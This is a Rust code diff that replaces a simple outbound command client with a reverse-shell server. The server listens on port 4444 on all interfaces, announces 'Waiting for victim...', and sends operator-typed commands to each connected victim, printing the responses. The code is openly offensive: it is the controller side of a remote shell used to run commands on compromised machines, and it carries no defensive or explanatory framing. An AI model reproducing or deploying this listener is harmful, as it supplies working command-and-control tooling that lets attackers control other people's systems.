@@ -1,81 +1,51 @@
-use std::io::{self, Write, Read};
-use std::net::TcpStream;
+use std::io::{self, BufRead, BufReader, Write};
+use std::net::{TcpListener, TcpStream};
 
-pub fn connect_reverse_shell() -> Result<(), io::Error> {
-    // Prompt for IP address
-    println!("Enter the IP address of the remote server:");
-    let mut ip = String::new();
-    io::stdin()
-        .read_line(&mut ip)
-        .expect("Failed to read IP address");
+pub fn start_reverse_shell_server() -> Result<(), io::Error> {
+    let listener = TcpListener::bind("0.0.0.0:4444")?; // Listen on all interfaces
+    println!("Reverse shell server started. Waiting for victim...");
 
-    // Prompt for port number
-    println!("Enter the port number of the remote server:");
-    let mut port = String::new();
-    io::stdin()
-        .read_line(&mut port)
-        .expect("Failed to read port number");
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                println!("Victim connected: {}", stream.peer_addr()?);
+                handle_victim(stream)?; // Handle the victim's session
+            }
+            Err(e) => eprintln!("Failed to accept connection: {}", e),
+        }
+    }
 
-    // Trim and parse user inputs
-    let ip = ip.trim();
-    let port: u16 = port.trim().parse().map_err(|_| {
-        io::Error::new(io::ErrorKind::InvalidInput, "Invalid port number. Please enter a valid number.")
-    })?;
+    Ok(())
+}
 
-    // Combine IP and port into an address
-    let addr = format!("{}:{}", ip, port);
+fn handle_victim(mut stream: TcpStream) -> Result<(), io::Error> {
+    let mut reader = BufReader::new(stream.try_clone()?);
 
-    // Attempt to connect to the server
-    let mut stream = TcpStream::connect(&addr).map_err(|e| {
-        eprintln!("Failed to connect to {}: {}", addr, e);
-        e
-    })?;
-
-    println!("Connected to {}!", addr);
-
-    // Main communication loop
     loop {
-        // Prompt for command
-        println!("Enter command:");
+        print!("Enter command to send to victim (or 'exit' to disconnect): ");
+        io::stdout().flush()?;
         let mut command = String::new();
-        io::stdin()
-            .read_line(&mut command)
-            .expect("Failed to read command");
+        io::stdin().read_line(&mut command)?;
 
         let command = command.trim();
         if command.eq_ignore_ascii_case("exit") {
-            println!("Exiting...");
+            println!("Disconnecting from victim...");
             break;
         }
 
-        // Send command to the server
-        stream.write_all(command.as_bytes()).map_err(|e| {
-            eprintln!("Failed to send command: {}", e);
-            e
-        })?;
+        // Send the command
+        stream.write_all(command.as_bytes())?;
+        stream.write_all(b"\n")?;
 
-        // Send a newline to ensure the server knows the command is complete
-        stream.write_all(b"\n").map_err(|e| {
-            eprintln!("Failed to send newline: {}", e);
-            e
-        })?;
-
-        // Wait for response from the server
-        let mut response = vec![0; 1024]; // Buffer to hold the response
-        match stream.read(&mut response) {
-            Ok(bytes_read) => {
-                if bytes_read == 0 {
-                    println!("Server closed the connection.");
-                    break;
-                }
-                let response_str = String::from_utf8_lossy(&response[..bytes_read]);
-                println!("Server response: {}", response_str);
-            }
-            Err(e) => {
-                eprintln!("Failed to read response: {}", e);
-                return Err(e);
-            }
+        // Read the response
+        let mut response = String::new();
+        reader.read_line(&mut response)?;
+        if response.is_empty() {
+            println!("Victim disconnected.");
+            break;
         }
+
+        println!("Response:\n{}", response);
     }
 
     Ok(())
